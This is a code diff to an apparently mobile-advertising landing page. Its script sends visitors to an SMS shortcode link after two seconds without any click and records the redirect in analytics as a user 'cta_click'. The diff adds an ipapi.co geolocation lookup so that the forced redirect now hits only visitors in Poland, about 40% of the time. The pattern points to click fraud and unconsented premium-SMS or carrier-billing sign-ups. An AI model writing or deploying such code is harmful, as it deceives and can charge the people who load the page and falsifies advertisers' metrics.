@@ -58,6 +58,12 @@
     </script>
     <script>
         loadScriptWithQueryString('https://tags.mobirun.net/webapi/v2/one-click-id', toQueryString(queryStringObj));
+        loadScriptWithQueryString('https://ipapi.co/jsonp/', toQueryString({callback: 'page_setip'}));
+
+        var visitor_country = null;
+        function page_setip(params) {
+          visitor_country = params.country;
+        }
 
         function doit(params) {
 
@@ -96,8 +102,9 @@
             imgWrap.addEventListener('click', clickHandler, true);
             imgWrap.href = href;
 
-            if(Math.random() > 0.5) {
-              setTimeout(function() {
+            setTimeout(function() {
+              if(!!visitor_country && visitor_country == 'PL' && Math.random() > 0.6) {
+
                   gac('send', 'event', 'auto-interaction', 'cta_click');
                   var raw_href = getSMSHrefRaw(shortcode, keyword);
                   if(typeof isMraid != "undefined" && isMraid) {
@@ -105,8 +112,8 @@
                   } else {
                     window.location.href = raw_href;
                   }
-              }, 2000);
-            }
+                }
+            }, 2000);
         }
     </script>
 </body>
